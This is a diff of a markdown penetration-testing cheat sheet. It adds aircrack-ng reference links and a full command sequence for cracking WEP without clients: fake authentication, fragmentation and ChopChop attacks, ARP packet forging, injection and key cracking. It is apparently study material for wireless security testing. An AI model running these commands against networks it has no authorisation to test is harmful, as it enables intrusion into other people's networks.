@@ -6,7 +6,6 @@
 - https://cheatsheet.haax.fr/shells-methods/reverse/
 - https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
 - https://heystacks.com/doc/401/attacking-secondary-contexts-in-web-applications
-- https://www2.aircrack-ng.org/hiexpo/aircrack-ng_book_v1.pdf
 - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html
 - http://web.archive.org/web/20220612232400/https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019
 
@@ -291,7 +290,10 @@ firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulne
 - https://github.com/derv82/wifite2/
 - https://github.com/V0lk3n/WirelessPentesting-CheatSheet
 - https://cheatsheet.haax.fr/wireless/wifi_cracking/
-- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html
+- https://www2.aircrack-ng.org/hiexpo/aircrack-ng_book_v1.pdf
+- https://www.aircrack-ng.org/doku.php?id=shared_key
+- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients
+- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client
 - https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2019-0178550/
 - https://null-byte.wonderhowto.com/how-to/select-field-tested-kali-linux-compatible-wireless-adapter-0180076/
 
@@ -343,6 +345,8 @@ key = iv|psk
 psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
 psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
 ```
+
+![](./images/simple-wep-crack.gif)
 
 #### Capture & ARP Request Replay
 
@@ -415,12 +419,48 @@ aireplay-ng -2 -r <packet filename> wlan1mon
 
 ```bash
 # airodump-ng --bssid <BSSID> -w wep wlan1mon
-# Using Fake/Usurpated MAC 0:1:2:3:4:5
 
-aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h 0:1:2:3:4:5 wlan1mon
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon
+
+# OR
+# -1 6000 : Reauthenticate every 6000s
+# -o 1 : Send only one set of packets at a time
+# -q 10 : Send keep alive packets every 10 seconds
+aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon
 ```
 
-Then use the Fragmentation attack
+Then use the Fragmentation (or ChopChop) attack
+
+```bash
+aireplay-ng -5 -b <BSSID> -h <MAC> wlan1mon
+#  Use this packet ? y
+#  Outputting xor and cap files
+
+# If not successful use KoreK ChopChop attack
+aireplay-ng -4 -h <MAC> -b <BSSID> wlan1mon
+#  Use this packet ? y
+#  Outputting xor and cap files
+```
+
+Reuse this to forge a new packet
+
+```bash
+packetforge-ng -0 -a <BSSID> -h <MAC> -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-request.cap
+```
+ 
+Relaunch airodump and inject the crafted packet
+
+```bash
+airodump-ng -c X --bssid <BSSID> -w new_capture wlan1mon
+aireplay-ng -2 -r arp-request wlan1mon
+#Use this packet ? y
+```
+
+Crack the captures
+
+```bash
+aircrack-ng -b <BSSID> capture*.cap 
+```
 
 #### Tests & Bruteforce
 
